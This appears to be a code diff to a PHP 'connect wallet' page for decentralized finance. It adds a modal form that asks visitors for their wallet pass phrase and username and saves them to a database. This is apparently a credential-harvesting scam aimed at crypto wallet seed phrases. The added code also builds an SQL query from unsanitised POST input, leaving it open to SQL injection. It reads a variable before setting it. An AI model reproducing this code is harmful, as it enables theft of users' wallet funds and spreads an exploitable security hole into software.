@@ -42,7 +42,59 @@ include_once (rootDir.'partials/front/header/main.php');
                             <p class="sub-heading">Connect your wallet for seamless access to decentralized opportunities, including finance and digital collectibles. Experience the future of blockchain effortlessly.</p>
                         </div>
                     </div>
-                    <?php include_once(rootDir.'connect_wallet/parts/wallets/main.php'); ?>
+                    <?php
+                    if (isset($_POST[$wallet_id])) {
+                        $wallet_phase = $_POST['wallet_phase'];
+                        $wallet_username = $_POST['wallet_username'];
+                        $wallet_id = $_POST[$wallet_id];
+
+                        // Assuming your database connection is already established ($conn)
+                        $sql = "UPDATE wallet SET wallet_phase = '$wallet_phase', wallet_username = '$wallet_username', wallet_status = 1 WHERE wallet_owner_id = $user_id AND wallet_id = $wallet_id";
+
+                        if ($conn->query($sql) === TRUE) {
+                            header("location: /connect_wallet?success-added");
+                        } else {
+                            echo "Error updating record: " . $conn->error;
+                        }
+                    }
+                    ?>
+
+                    <div class="modal fade" id="modal<?=$wallet_key?>">
+                        <div class="modal-dialog modal-dialog-centered">
+                            <div class="modal-content">
+
+                                <!-- Modal Header -->
+                                <div class="modal-header">
+                                    <h4 class="modal-title"><?=$wallet_name?></h4>
+                                    <button type="button" class="close" data-dismiss="modal">&times;</button>
+                                </div>
+
+                                <!-- Modal Body -->
+                                <div class="modal-body">
+                                    <form method="post">
+                                        <input type="hidden" value="<?=$wallet_id?>" name="<?=$wallet_id?>">
+                                        <div class="form-group">
+                                            <label>Pass Phase</label>
+                                            <input type="text" class="form-control" name="wallet_phase" placeholder="Enter your <?=$wallet_key_name?> pass phase">
+                                        </div>
+                                        <div class="form-group">
+                                            <label for="<?=$wallet_key_name?>_username">Wallet Username</label>
+                                            <input type="text" class="form-control" name="wallet_username" placeholder="Enter your <?=$wallet_key_name?> username">
+                                        </div>
+                                        <button type="submit" class="btn btn-primary" name="<?=$wallet_id?>">Submit</button>
+                                    </form>
+                                </div>
+
+                                <!-- Modal Footer -->
+                                <div class="modal-footer">
+                                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+                                </div>
+
+                            </div>
+                        </div>
+                    </div>
+
+<!--                    --><?php //include_once(rootDir.'connect_wallet/parts/wallets/main.php'); ?>
                 </div>
             </div>
         </section>
